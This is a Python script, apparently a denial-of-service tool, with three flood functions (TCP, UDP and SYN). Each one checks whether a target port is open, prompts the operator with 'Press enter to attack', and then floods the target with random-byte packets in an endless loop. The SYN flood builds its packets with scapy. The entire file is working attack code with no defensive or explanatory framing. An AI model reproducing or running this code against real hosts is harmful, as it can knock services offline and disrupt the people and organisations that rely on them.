import socket, random
from scapy.all import *

def random_ip():
    ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
    return ip


def tcpflood(ip, port, packet_size):
    sent = 0
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    con = s.connect_ex((ip, port))
    if con == 0:
        input("[+] Target has port {} open. Press enter to attack".format(str(port)))
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            con = s.connect_ex((ip, port))
            if con == 0:
                packet = random._urandom(packet_size)
                s.sendall(packet)
                sent += 1
                print("(+) Sent {packets} packets : {packet}".format(packets=sent, packet=packet[:20]), end='\r')
            else:
                input("\n(+) Target is either down or blocking your requests")
                break
    else:
        input("[+] Target does not have port {} open. Press enter to exit".format(str(port)))
    


def udpflood(ip, port, packet_size):
    sent = 0
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(1)
    con = s.connect_ex((ip, port))
    if con == 0:
        input("[+] Target has port {} open. Press enter to attack".format(str(port)))
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            con = s.connect_ex((ip, port))
            if con == 0:
                packet = random._urandom(packet_size)
                s.send(packet)
                sent += 1
                print("(+) Sent {packets} packets : {packet}".format(packets=sent, packet=packet[:20]), end='\r')
            else:
                input("\n(+) Target is either down or blocking your requests")
                break
    else:
        input("[+] Target does not have port {} open. Press enter to exit".format(str(port)))

def synflood(ip, port, packet_size):
    sent = 0

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)

    con = s.connect_ex((ip, port))
    if con == 0:
        input("[+] Target has port {} open. Press enter to attack".format(str(port)))


        while True:

            ip_packet = IP(dst=ip)
            syn_packet = TCP(dport=port, flags='S')
            packet = random._urandom(packet_size)
            syn_request = ip_packet / syn_packet / packet

            send(syn_request, verbose=False)
            sent += 1
            print("(+) Sent {packets} packets : {packet}".format(packets=sent, packet=packet[:20]), end='\r')
    else:
        input("[+] Target does not have port {} open. Press enter to exit".format(str(port)))
        
